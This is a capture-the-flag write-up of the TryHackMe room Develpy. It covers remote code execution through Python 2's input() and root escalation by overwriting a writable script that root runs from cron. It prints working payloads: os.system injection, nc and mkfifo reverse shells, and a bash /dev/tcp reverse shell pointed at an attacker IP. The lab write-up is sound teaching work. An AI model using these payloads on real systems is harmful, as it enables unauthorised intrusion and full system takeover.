## Overview

Develpy is a Medium-rated TryHackMe room centred around a custom network service running a vulnerable Python 2 script. The challenge involves identifying and exploiting Python 2's `input()` evaluation behaviour for remote code execution, enumerating cron jobs to identify a privilege escalation path, and optionally decoding credentials hidden inside a Piet steganography image.

**Attack chain:**

```
Recon → Custom service on port 10000 discovered
→ Python 2 input() RCE → Shell as king
→ Cron job enumeration → Writable root.sh identified
→ Replace root.sh with reverse shell → Root shell
```

## 1. Recon

Started with a full port scan:

```bash
nmap -sV -sC -p- <TARGET_IP>
```

```
PORT      STATE SERVICE
10000/tcp open  unknown
```

The service wasn't stationed on the default TCP port -- viewing the custom service displayed this:

![Webpage on custom port](/assets/images/writeups/develpy/develpy_webpage.png)

A custom service running on port 10000. Connecting via netcat:

```bash
nc <TARGET_IP> 10000
```

```
        Private 0days

 Please enther number of exploits to send??:
```

The service prompts for a number. Testing with a non-integer input `t` returned a Python traceback — immediately revealing two critical pieces of information:

```
Traceback (most recent call last):
  File "./exploit.py", line 6, in <module>
    num_exploits = int(input(' Please enther number of exploits to send??: '))
  File "<string>", line 1, in <module>
NameError: name 't' is not defined
```

- The service is running `exploit.py`
- The error `name 't' is not defined` — Python treated `t` as a variable name, not a string. This is the behaviour of Python 2's `input()`

The traceback is doing half the recon work for us. Never dismiss error messages — they're information.

## 2. Python 2 input() RCE

Python 2's `input()` is fundamentally dangerous. In Python 3, `input()` always returns a string — whatever you type is treated as text. In Python 2, `input()` is equivalent to `eval(raw_input())` — whatever you type gets **evaluated as Python code**.

```
Python 3 input("test") → "test" (string)
Python 2 input("test") → eval("test") → NameError: name 'test' is not defined
```

This means we can pass arbitrary Python expressions directly into the interpreter. Testing with a system command:

```python
__import__('os').system('whoami')
```

Output:

```
king
```

Remote code execution confirmed as `king`. The `__import__('os')` syntax is used here because standard `import os` is a statement — not an expression — so it can't be used inline with `input()`. `__import__` is the function form, which evaluates cleanly.

## 3. Reverse Shell as King

Set up a listener on Kali:

```bash
nc -lvnp 4001
```

I initially tried to implement this payload:

```bash
__import__(‘os’).system(‘nc -e /bin/bash <your-VPN-ip> 4444’)
```

Unfortunately the `nc -e` flag was unavailable on the target — a common restriction. Used a `mkfifo` based reverse shell instead:

```python
__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <KALI_IP> 4001 >/tmp/f')
```

**Important:** Send only the payload — no comments, no extra lines. Python 2's `input()` reads a single line. A `#` comment on the same line will cause a `SyntaxError`.

Shell received. Stabilised — the target had Python 2 installed, so used `python` not `python3`:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## 4. Enumeration as King

```bash
ls -la /home/king
```

```
-rwxrwxrwx  credentials.png   # Piet steganography image
-rwxrwxrwx  exploit.py        # The vulnerable service
-rw-r--r--  root.sh           # Executed by root via cron
-rw-rw-r--  run.sh            # Owned by king — writable
-rw-rw-r--  user.txt          # User flag
```

Retrieved the user flag:

```bash
cat user.txt
```

Checked cron jobs:

```bash
cat /etc/crontab
```

```
*  *  *  *  *  king    cd /home/king/ && bash run.sh
*  *  *  *  *  root    cd /home/king/ && bash root.sh
*  *  *  *  *  root    cd /root/company && bash run.sh
```

Three cron jobs executing every minute. Two running as `root`. Viewing both scripts:

```bash
cat run.sh
```

```bash
#!/bin/bash
kill cat /home/king/.pid
socat TCP-LISTEN:10000,reuseaddr,fork EXEC:./exploit.py,pty,stderr,echo=0 &
echo $! > /home/king/.pid
```

`run.sh` restarts the vulnerable service every minute — keeping the Python 2 exploit alive.

```bash
cat root.sh
```

```bash
python /root/company/media/*.py
```

`root.sh` executes Python scripts from `/root/company/media/` — running as root every minute.

The critical observation — `root.sh` lives in `/home/king/`. King owns the directory. This is a **Principle of Least Privilege** violation — root is executing a script that an unprivileged user controls.

## 5. Privilege Escalation — Cron Job Abuse

The attack is straightforward once the misconfiguration is identified:

```
root executes root.sh every minute
root.sh lives in /home/king/
king owns /home/king/
king can delete and recreate root.sh
```

Set up a listener:

```bash
nc -lvnp 4444
```

Replaced `root.sh` with a reverse shell payload:

```bash
echo 'bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1' > root.sh
```

Waited up to one minute for cron to fire.

Root shell received.

```bash
cat /root/root.txt
```
![Root terminal](/assets/images/writeups/develpy/root.png)

The complexity of this room made me overthink initially. The privesc was sitting in plain sight — careful enumeration and trusting the methodology was all it took. The basics always work.

## 6. Credentials — Piet Steganography [OPTIONAL]

Now this step was put in last as I initially had challenges extracting the embedded data within the image — and if your reverse shell was stable and you had no issues — this is sort of irrelevant to the room in my opinion.

![NPIET Website](/assets/images/writeups/develpy/npiet.png)
  *Utilise this "[Online npiet decoder](https://www.bertnase.de/npiet/npiet-execute.php)" to extract the encoded data.*

Unfortunately for me, decoding returned errors that I couldn't fix. The online interpreter returned a server-side PHP error — imagesy(): Argument #1 must be of type GdImage — a bug on their end, not the image.
The remaining steps completed was an alternative to avoid the issue. 

`credentials.png` in king's home directory was a **Piet** image. Piet is an esoteric programming language where code is encoded directly in the colour patterns of an image — blocks of colour are the executable instructions.

`npiet` is the interpreter required to run Piet programs. It isn't available via `apt` on Kali and requires building from source:

```bash
sudo apt install libgd-dev
wget https://www.bertnase.de/npiet/npiet-1.3f.tar.gz
tar -xvf npiet-1.3f.tar.gz
cd npiet-1.3f
```

The source has an outdated function signature incompatible with modern GCC. Before compiling, open `npiet.c` and locate the `do_signal` function using `Ctrl+W` in nano:

```c
# Before
do_signal ()

# After
do_signal (int sig)
```

The modern C standard requires signal handlers to accept an `int` parameter. Without this fix, `make` throws a `-Wincompatible-pointer-types` error.

Build and install:

```bash
make
sudo cp npiet /usr/local/bin/
```

Run against the image:

```bash
npiet credentials.png
```

Output reveals the credentials for king's account — the same ones used to access the service initially.

## Key Takeaways

| Technique | Lesson |
|---|---|
| Python 2 `input()` RCE | Python 2 `input()` evaluates expressions — equivalent to `eval()`. Never expose to user input |
| Error message analysis | The traceback revealed the script name, language version, and vulnerable function — all from one bad input |
| Cron job enumeration | Always check `/etc/crontab` and the file permissions of every script executed by privileged users |
| Writable cron script | If you can write to a script root executes, you own the machine. File ownership in privileged directories is critical |
| Principle of Least Privilege | Root executing a user-owned script is a critical misconfiguration — the directory permissions are as important as the file permissions |
| Piet steganography | Colour patterns in images can encode executable programs — unusual image files in CTFs are always worth investigating |
| mkfifo reverse shell | When `nc -e` is unavailable, mkfifo creates a bidirectional pipe for a reverse shell |
